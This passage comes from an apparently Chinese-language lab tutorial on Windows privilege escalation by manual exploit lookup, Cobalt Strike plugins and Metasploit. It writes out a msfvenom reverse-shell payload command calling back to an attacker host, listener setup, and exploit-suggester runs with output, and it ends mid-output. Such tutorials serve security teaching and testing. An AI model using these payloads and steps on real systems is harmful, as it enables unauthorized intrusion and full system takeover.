title="溢出提权三种方式的直接链接">​</a></h3><ul><li>手动提权：手动提权就是基于自己去搜集相关的补丁，然后进行提权。</li><li>CS半自动化提权：上传木马，然后通过一下插件实现半自动化提权。</li><li>MSF全自动提权：MSF就是通过内置的一些功能，实现全自动提权。</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="手动溢出提权">手动溢出提权<a href="#手动溢出提权" class="hash-link" aria-label="手动溢出提权的直接链接" title="手动溢出提权的直接链接">​</a></h2><p>关于手动提权这里只能大致说一下整体的提权流程，关于演示，由于环境原因，确实不好进行演示，而且在提权中，不代表找到相应的EXP就一定能够提权成功，在提权过程中可能会遇到很多的困难解决不好，最关键的就是杀毒软件。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="上线">上线<a href="#上线" class="hash-link" aria-label="上线的直接链接" title="上线的直接链接">​</a></h3><p>这里通过文件上传已经将一句话木马连接上去，并且用户只是一个普通用户，这里的admin是我自己设置的，我们提权需要提到system权限才可以执行我们想要的任何操作。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/15/49GvUDuaPSEAeM1.png#alt=image-20230315203725996" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="信息收集-1">信息收集<a href="#信息收集-1" class="hash-link" aria-label="信息收集的直接链接" title="信息收集的直接链接">​</a></h3><h4 class="anchor anchorWithStickyNavbar_LWe7" id="查找补丁信息及版本信息">查找补丁信息及版本信息<a href="#查找补丁信息及版本信息" class="hash-link" aria-label="查找补丁信息及版本信息的直接链接" title="查找补丁信息及版本信息的直接链接">​</a></h4><p>通过信息收集我们获取到，该系统是一个Windows10 专业版，其实这里就已经将打的补丁显示出来了，只是这里并未进行补丁修补而已，所以没有记录。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/15/PEc3g9nlewj2BvM.png#alt=image-20230315203956641" class="img_ev3q"></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="查询杀软信息">查询杀软信息<a href="#查询杀软信息" class="hash-link" aria-label="查询杀软信息的直接链接" title="查询杀软信息的直接链接">​</a></h4><p>查看是否存在杀软，也就是运行软件中，看看是否存在相关的杀毒软件，这里我们查询后发现，并没杀毒软件，不过需要注意的是，正常情况下那台服务器没有杀毒软件，而且部分杀毒软件还能够自动识别是否在执行提权操作。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/15/1o7KfUzqIu9RNWS.png#alt=image-20230315204329350" class="img_ev3q"></p><p>上面是通过手动比较来进行查看是否存在杀软，这里采用在线的杀软比较，确实不存在杀软。</p><p>在线杀软查询：<a href="https://i.hacking8.com/tiquan/" target="_blank" rel="noopener noreferrer">https://i.hacking8.com/tiquan/</a></p><p><img loading="lazy" src="https://s2.loli.net/2023/03/15/YkBvMXwuG4OsWLE.png#alt=image-20230315205507322" class="img_ev3q"></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="自动提权可利用exp编号">自动提权可利用EXP编号<a href="#自动提权可利用exp编号" class="hash-link" aria-label="自动提权可利用EXP编号的直接链接" title="自动提权可利用EXP编号的直接链接">​</a></h4><p>这里寻找可利用的exp，注意这里我本地安装的虚拟机我找了好几个都是没有安装任何补丁的，所以提交上去显示也是无法进行比较的。这里就把整个流程都说一下吧，一般情况下手动提权还是比较困难的，而且比较费事。</p><p>在进行提权辅助的时候，需要将下面的远程代码执行取消，由于我们只需要进行权限提升，所以我们只查询权限提升的方式，其它的我们不管。</p><p>提权EXP识别平台：<a href="https://i.hacking8.com/tiquan/" target="_blank" rel="noopener noreferrer">https://i.hacking8.com/tiquan/</a></p><p>python工具识别：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener noreferrer">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p><p><img loading="lazy" src="https://s2.loli.net/2023/03/15/I6iTOwfc2JMGeRj.png#alt=image-20230315210349452" class="img_ev3q"></p><p>当查询相关的可进行权限提升的编号后，会在页面的下发显示出相应的编号，任何去寻找相应的编号的EXP即可。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/15/jztf8pydFDsBiu4.png#alt=image-20230315210328714" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="寻找exp">寻找EXP<a href="#寻找exp" class="hash-link" aria-label="寻找EXP的直接链接" title="寻找EXP的直接链接">​</a></h3><p>寻找EXP是寻找通过之前补丁识别出来的可利用的EXP编号，通过寻找到的EXP然后进行利用，这里我本地也是也不好演示，所以就不演示了，正常相应的EXP找到后，都会存在利用方式的，并且通过截图演示，也看不出效果。</p><p>这里还需要注意，寻找到的EXP不代表就一定能够提权成功，因为你不知道编写EXP的人的测试环境是什么情况，比如人家在Windows10 2022H1上能够成功，但是你在2022H2上不一定能够成功，虽然都没安装补丁，但是就会出现这种，提权不了的情况。</p><p>下面列举几个寻找EXP的地址。</p><p><a href="https://github.com/Ascotbe/Kernelhub/tree/master/Windows" target="_blank" rel="noopener noreferrer">https://github.com/Ascotbe/Kernelhub/tree/master/Windows</a></p><p><a href="https://github.com/lyshark/Windows-exploits" target="_blank" rel="noopener noreferrer">https://github.com/lyshark/Windows-exploits</a></p><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener noreferrer">https://github.com/SecWiki/windows-kernel-exploits</a></p><p><a href="https://github.com/klsfct/getshell" target="_blank" rel="noopener noreferrer">https://github.com/klsfct/getshell</a></p><p>比如这里上面的截图的CVE-2021-1732的EXP，以及在页面的下方都列举出利用的方式。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/15/xGY3JFjQIqVlhvD.png#alt=image-20230315212259940" class="img_ev3q"></p><p>当然如果说寻找到EXP编号后，在这些地址中并没有可利用的exp信息，那么可以直接在github上搜索即可，可以看到搜索后显示出很多的EXP都可以进行测试。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/15/CEtGhJjVc1xLbaW.png#alt=image-20230315212752058" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="提权exp运行方式">提权EXP运行方式<a href="#提权exp运行方式" class="hash-link" aria-label="提权EXP运行方式的直接链接" title="提权EXP运行方式的直接链接">​</a></h3><ul><li>直接执行exe程序，成功后会打开一个cmd窗口，在新窗口中权限就是system</li><li>在WebShell中执行exe程序，执行方式为xx.exe whoami，成功后直接执行命令，再修改命令内容，可以执行不同的命令</li><li>利用MSF等工具</li><li>C++源码，Python脚本，PowerShell脚本等特殊方式</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cs半自动化溢出提权">CS半自动化溢出提权<a href="#cs半自动化溢出提权" class="hash-link" aria-label="CS半自动化溢出提权的直接链接" title="CS半自动化溢出提权的直接链接">​</a></h2><p>CS半自动提权，简单来说就是当你把文件上传上去后，然后通过CS生成一个后门，将后门上传至服务器中，再使用CS上安装的各类插件来进行半自动化提权。</p><p>这里可能不单单使用的是溢出提权，还有可能使用的是其它的提权方式。</p><p>这里使用的是Windows2012环境。</p><p>CS工具介绍：<a href="https://blog.csdn.net/weixin_44268918/article/details/128857998?spm=1001.2014.3001.5501" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/weixin_44268918/article/details/128857998?spm=1001.2014.3001.5501</a></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="上线-1">上线<a href="#上线-1" class="hash-link" aria-label="上线的直接链接" title="上线的直接链接">​</a></h3><p>这里通过CS生成木马上传，并执行，通常来说通过文件上传获取到的权限都比较低，所以在运行木马的时候，也都是普通权限运行，导致木马也就是普通权限，只有当使用管理员启动，才是基本的管理员权限。</p><p>这里不用太在意我这个上线就是administrator权限，我们主要目标就是system的权限。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/16/cAanj8Hf5LWqEF7.png#alt=image-20230316092046007" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="提权插件">提权插件<a href="#提权插件" class="hash-link" aria-label="提权插件的直接链接" title="提权插件的直接链接">​</a></h3><p>这里推荐几个提权插件，这些插件都是经过测试的，像之前手动提权，多多少少存在编写EXP人的和你的环境不同，可能就导致别人能够提权成功，而你无法提权成功的情况。</p><p>这些插件都集成了很多的功能，原版CS上的功能很少，基本上就是一个类似MSF的一个图像化工具，当装上插件后，就可以使得CS摇身一变，变成内网大杀器。</p><p>梼杌：<a href="https://github.com/pandasec888/taowu-cobalt-strike" target="_blank" rel="noopener noreferrer">https://github.com/pandasec888/taowu-cobalt-strike</a></p><p>ladon：<a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener noreferrer">https://github.com/k8gege/Aggressor</a></p><p><img loading="lazy" src="https://s2.loli.net/2023/03/16/TXsFH3Ow8n9yuZR.png#alt=image-20230316092109387" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="当前权限">当前权限<a href="#当前权限" class="hash-link" aria-label="当前权限的直接链接" title="当前权限的直接链接">​</a></h3><p>通过输入命令查看，当前权限就是一个普通权限，虽然可能能够执行一些管理员的操作，但是我们需要的是将权限提升到system，这样我们想执行什么命令就能够执行什么命令。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/16/RqHz3rQCs4txZPu.png#alt=image-20230316092139053" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="提权操作">提权操作<a href="#提权操作" class="hash-link" aria-label="提权操作的直接链接" title="提权操作的直接链接">​</a></h3><h4 class="anchor anchorWithStickyNavbar_LWe7" id="选择提权方式">选择提权方式<a href="#选择提权方式" class="hash-link" aria-label="选择提权方式的直接链接" title="选择提权方式的直接链接">​</a></h4><p>这里使用梼杌进行提权，选择sweetpotato，然后继续提权。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/16/Q2prUXwxPJksOKc.png#alt=image-20230316092405248" class="img_ev3q"></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="提权成功">提权成功<a href="#提权成功" class="hash-link" aria-label="提权成功的直接链接" title="提权成功的直接链接">​</a></h4><p>可以看到这里弹出一个system的权限连接，即证明提权成功，当然这里不代表任何一个提权都能够成功的，有些提权方式可能会由于操作系统的不同，导致失败，这里我选择sweetpotato进行提权就是的，前面几个都提权失败了，有不成功的，有系统不匹配的，所以多试试，当然也可以安装更多的插件，使用不同插件中的不同的提权方式，总之多试试。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/16/pdxObCLtYvhy9Zs.png#alt=image-20230316092835343" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="msf全自动溢出提权">MSF全自动溢出提权<a href="#msf全自动溢出提权" class="hash-link" aria-label="MSF全自动溢出提权的直接链接" title="MSF全自动溢出提权的直接链接">​</a></h2><p>如果对MSF工具不熟悉的可以参考以下的连接进行学习，这个只是上篇，在博客主页中能够找到下篇。这里使用的环境是Windows7，由于Windows2012上没有补丁信息，就会导致无法识别的情况。</p><p>MSF工具使用：<a href="https://blog.csdn.net/weixin_44268918/article/details/128775978?spm=1001.2014.3001.5501" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/weixin_44268918/article/details/128775978?spm=1001.2014.3001.5501</a></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="监听操作">监听操作<a href="#监听操作" class="hash-link" aria-label="监听操作的直接链接" title="监听操作的直接链接">​</a></h3><h4 class="anchor anchorWithStickyNavbar_LWe7" id="生成木马">生成木马<a href="#生成木马" class="hash-link" aria-label="生成木马的直接链接" title="生成木马的直接链接">​</a></h4><p>通过msfvenom生成一个木马，然后将木马上传至服务器中，即可。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.20 LPORT=3333 -f exe -o msf.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST=kali地址</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPORT=自定义设置一个端口</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" src="https://s2.loli.net/2023/03/16/botig5j21eJkNqD.png#alt=image-20230316094456638" class="img_ev3q"></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="监听木马">监听木马<a href="#监听木马" class="hash-link" aria-label="监听木马的直接链接" title="监听木马的直接链接">​</a></h4><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; use exploit/multi/handler    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Using configured payload generic/shell_reverse_tcp   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp    ##配置监听TCP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload =&gt; windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set lport 3333    ##配置监听端口</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lport =&gt; 3333</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0  ##配置监听地址，你也可以设置监听本机地址如192.168.10.20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lhost =&gt; 0.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; run  ##开始监听</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" src="https://s2.loli.net/2023/03/16/Wmuj7D1NqY635x4.png#alt=image-20230316095121748" class="img_ev3q"></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="上线-2">上线<a href="#上线-2" class="hash-link" aria-label="上线的直接链接" title="上线的直接链接">​</a></h4><p>当讲木马上传后，然后进行运行，即可在kali中显示上线选项，并自动反弹会话窗口，可以看到这里监听到192.168.10.150上线。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/16/DypGgncmQzSk6uT.png#alt=image-20230316101217168" class="img_ev3q"></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="查看权限">查看权限<a href="#查看权限" class="hash-link" aria-label="查看权限的直接链接" title="查看权限的直接链接">​</a></h4><p>这里还是一样的获取到的权限是administrator，由于演示麻烦，未直接从webshell上执行，所以才会出现administrator的权限，但是不用管，我们需要的是将权限提升到system。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/16/9RlpJZ35WMknQT6.png#alt=image-20230316101235198" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="半自动化提权操作">半自动化提权操作<a href="#半自动化提权操作" class="hash-link" aria-label="半自动化提权操作的直接链接" title="半自动化提权操作的直接链接">​</a></h3><h4 class="anchor anchorWithStickyNavbar_LWe7" id="提权模块">提权模块<a href="#提权模块" class="hash-link" aria-label="提权模块的直接链接" title="提权模块的直接链接">​</a></h4><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use post/windows/gather/enum_patches 半自动：根据漏洞编号找出系统中安装的补丁</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="操作设置">操作设置<a href="#操作设置" class="hash-link" aria-label="操作设置的直接链接" title="操作设置的直接链接">​</a></h4><p>这里半自动化，在获取后，还是需要手动去找，这里就和手动溢出漏洞提权差不多，所以这里就演示一下。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patches   ##设置半自动提权</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 post(windows/gather/enum_patches) &gt; options  ##查看参数</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Module options (post/windows/gather/enum_patches):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Name     Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ----     ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   SESSION  1                yes       The session to run this module on</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">View the full module info with the info, or info -d command.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 post(windows/gather/enum_patches) &gt; set session 2  ##设置编号，也就是刚刚上线的编号。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">session =&gt; 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 post(windows/gather/enum_patches) &gt; run  ##开始收集</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Running module against ADMIN-PC (192.168.10.40)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Installed Patches</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">=================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  HotFix ID  Install Date</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ---------  ------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  KB2534111  1/5/2023</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  KB976902   11/21/2010</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Patch list saved to /root/.msf4/loot/20230316101403_default_192.168.10.40_enum_patches_978734.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Post module execution completed</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" src="https://s2.loli.net/2023/03/16/DK1LdQAzpiV2U3S.png#alt=image-20230316101445184" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="全自动化提权操作">全自动化提权操作<a href="#全自动化提权操作" class="hash-link" aria-label="全自动化提权操作的直接链接" title="全自动化提权操作的直接链接">​</a></h3><h4 class="anchor anchorWithStickyNavbar_LWe7" id="提权模块-1">提权模块<a href="#提权模块-1" class="hash-link" aria-label="提权模块的直接链接" title="提权模块的直接链接">​</a></h4><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use post/multi/recon/local_exploit_suggester 全自动：快速识别系统中可能利用的漏洞</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="操作设置-1">操作设置<a href="#操作设置-1" class="hash-link" aria-label="操作设置的直接链接" title="操作设置的直接链接">​</a></h4><p>这里需要注意，如果出现的漏洞比较少，可以将参数SHOWDESCRIPTION，设置为true。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; use post/multi/recon/local_exploit_suggester  ##设置全自动化提权</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 post(multi/recon/local_exploit_suggester) &gt; options   ##设置参数</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Module options (post/multi/recon/local_exploit_suggester):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Name             Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ----             ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   SESSION                           yes       The session to run this module on</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">View the full module info with the info, or info -d command.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2   ##设置会话编号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">session =&gt; 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 post(multi/recon/local_exploit_suggester) &gt; run  ##开始检测</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="提权结果">提权结果<a href="#提权结果" class="hash-link" aria-label="提权结果的直接链接" title="提权结果的直接链接">​</a></h4><p>在结果中，yes是可能存在的漏洞利用，no是没有的意思，这里我直接使用代码信息来表示吧，截图太大了。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.10.40 - Collecting local exploits for x86/windows...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.10.40 - 174 exploit checks are being tried...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.10.40 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.10.40 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.10.40 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.10.40 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.10.40 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.10.40 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.10.40 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.10.40 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.10.40 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.10.40 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Running check method for exploit 41 / 41</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.10.40 - Valid modules for session 2:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> #   Name                                                           Potentially Vulnerable?  Check Result</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> -   ----                                                           -----------------------  ------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 2   exploit/windows/local/ikeext_service                           Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.</span><br></span><span 